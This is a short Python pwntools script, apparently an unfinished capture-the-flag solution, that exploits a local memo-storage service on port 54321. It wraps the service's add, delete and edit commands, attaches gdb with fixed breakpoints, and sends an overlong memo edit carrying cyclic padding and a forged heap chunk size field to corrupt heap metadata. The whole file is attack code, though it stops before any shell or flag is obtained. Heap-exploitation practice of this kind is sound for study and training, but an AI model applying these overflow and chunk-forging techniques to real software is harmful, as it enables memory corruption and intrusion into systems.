#!/usr/bin/env python

from pwn import *

context.bits=64
context.terminal=['tmux','splitw','-h']

p=remote("localhost",54321)

def attach():
    gdb.attach(p, '''
              break *0x400e68
              set $bla=0x602410
              set $cla=0x602040
               c
    ''')

def add_memo(memo):
    p.sendline('A')
    p.sendline(str(len(memo)))
    p.sendline(memo)
    return p.readuntil("(CMD)>>> ")

def delete_memo(i):
    p.sendline('D')
    p.sendline(str(i))
    return p.readuntil("(CMD)>>> ")

def edit_memo(index, copy):
    p.sendline('E')
    p.sendline(str(index))
    p.sendline(copy)
    p.sendline('Y')
    return p.readuntil("(CMD)>>> ")

def refresh():
    p.sendline('')
    return p.readuntil("(CMD)>>> ")

p.readuntil("(CMD)>>> ")

f=[cyclic(0x100 - 0x20),0,0x50 | 0b001, cyclic(0x50)]

add_memo('Z'*0x100)

raw_input("[DEBUG]")
pause()

edit_memo(1, flat(f))
